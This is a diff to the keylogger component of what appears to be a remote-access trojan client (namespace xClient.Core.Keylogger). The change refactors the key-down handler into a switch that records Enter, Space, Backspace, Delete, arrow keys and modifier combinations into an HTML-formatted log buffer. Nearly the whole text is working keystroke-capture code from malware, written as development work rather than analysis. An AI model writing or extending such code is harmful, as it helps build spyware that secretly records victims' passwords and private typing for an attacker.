@@ -131,7 +131,9 @@ namespace xClient.Core.Keylogger
 
         private void OnKeyDown(object sender, KeyEventArgs e) //Called first
         {
-            if (PressedKeys.Contains(Keys.LControlKey) //if modifier keys are still down, they will be highlighted, including any other key pressed
+            // If modifier keys are still down, the key code provided will
+            // be recorded for flushing to the 
+            if (PressedKeys.Contains(Keys.LControlKey)
                 || PressedKeys.Contains(Keys.RControlKey)
                 || PressedKeys.Contains(Keys.LMenu)
                 || PressedKeys.Contains(Keys.RMenu)
@@ -139,40 +141,54 @@ namespace xClient.Core.Keylogger
                 || PressedKeys.Contains(Keys.RWin))
             {
                 if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
+                {
                     PressedKeys.Add(e.KeyCode);
-            }
-            else if ((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z) //exclude keys here we don't want to log and return, KeyPress event can handle these if it is a character value
-                || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
-                || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
-                || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
-                || (e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey)
-                || (e.KeyCode == Keys.CapsLock)))
-            {
-                return;
-            }
-            else if (e.KeyCode == Keys.Enter)
-            {
-                _logFileBuffer.Append("<font color=\"0000FF\">(ENTER)</font><br>"); //this could be where the KeyloggerKeys enum would be handy
-            }
-            else if (e.KeyCode == Keys.Space)
-            {
-                _logFileBuffer.Append(" ");
-            }
-            else if (e.KeyCode == Keys.Back)
-            {
-                _logFileBuffer.Append("<font color=\"0000FF\">(BACK)</font>");
-            }
-            else if (e.KeyCode == Keys.Delete)
-            {
-                _logFileBuffer.Append("<font color=\"0000FF\">(DEL)</font>");
+                }
             }
             else if (e.KeyCode >= Keys.Left && e.KeyCode <= Keys.Down)
             {
                 _logFileBuffer.Append("<font color=\"0000FF\">(" + e.KeyCode.ToString() + ")</font>");
             }
             else
-                if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
-                    PressedKeys.Add(e.KeyCode);
+            {
+                switch (e.KeyCode)
+                {
+                    case Keys.Enter:
+                        _logFileBuffer.Append("<font color=\"0000FF\">(ENTER)</font><br>"); //this could be where the KeyloggerKeys enum would be handy
+                        break;
+                    case Keys.Space:
+                        _logFileBuffer.Append(" ");
+                        break;
+                    case Keys.Back:
+                        _logFileBuffer.Append("<font color=\"0000FF\">(BACK)</font>");
+                        break;
+                    case Keys.Delete:
+                        _logFileBuffer.Append("<font color=\"0000FF\">(DEL)</font>");
+                        break;
+                    default:
+                        {
+                            // The keys below are excluded. If it is one of the keys below,
+                            // the KeyPress event will handle these characters. If the keys
+                            // are not any of those specified below, we can continue.
+                            if (!((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z)
+                            || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
+                            || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
+                            || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
+                            || (e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey)
+                            || (e.KeyCode == Keys.CapsLock))))
+                            {
+                                // The key was not part of the keys that we wish to filter, so
+                                // be sure to prevent a situation where multiple keys are pressed.
+                                if (!PressedKeys.Contains(e.KeyCode))
+                                {
+                                    PressedKeys.Add(e.KeyCode);
+                                }
+                            }
+
+                            break;
+                        }
+                }
+            }
         }
 
         private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
